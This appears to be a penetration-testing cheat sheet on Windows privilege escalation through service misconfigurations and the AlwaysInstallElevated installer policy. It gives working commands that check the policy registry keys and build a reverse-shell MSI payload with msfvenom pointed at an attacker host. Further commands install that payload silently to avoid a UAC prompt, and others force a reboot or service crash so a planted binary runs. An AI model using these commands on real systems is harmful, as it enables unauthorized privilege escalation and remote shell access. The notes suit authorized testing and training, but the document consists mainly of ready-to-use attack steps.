# Windows services and installer policy

| Control | File |
| --- | --- |
| Write the service executable on disk | [service-binary-hijacking](service-binary-hijacking.md) |
| Change the service config (`binPath`) | [service-permissions](service-permissions.md) |
| Write a path Windows tries before the real exe | [unquoted-service-paths](unquoted-service-paths.md) |
| Scheduled task / autorun | [scheduled-tasks-and-autoruns](scheduled-tasks-and-autoruns.md) |

## Installer policy
Both values must be `1`:
```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=<PORT> -f msi-nouac -o <PAYLOAD>.msi
```
```cmd
msiexec /quiet /qn /i <PAYLOAD>.msi
```
- `-f msi-nouac`, not `-f msi`: plain `msi` shows a UAC consent dialog on install, which nobody is there to click through under `/quiet /qn`.
- icacls legend: [service-binary-hijacking.md](service-binary-hijacking.md#icacls-rights-legend).

## Can't restart the service
No `SERVICE_START`/`SERVICE_STOP`, but the box reboots or shuts down on its own schedule, or you hold `SeShutdownPrivilege`:
```powershell
(Get-CimInstance -ClassName Win32_Service -Filter "Name='<SERVICE>'").StartMode
```
```cmd
shutdown /r /t 0
```
- `StartMode` = `Auto` → your planted binary/DLL/path runs on the next boot without needing service-control rights.
- `sc.exe qfailure <SERVICE>` shows the failure-recovery action: `RESTART` means crashing the running process (if you can) retriggers it without `SERVICE_START`.
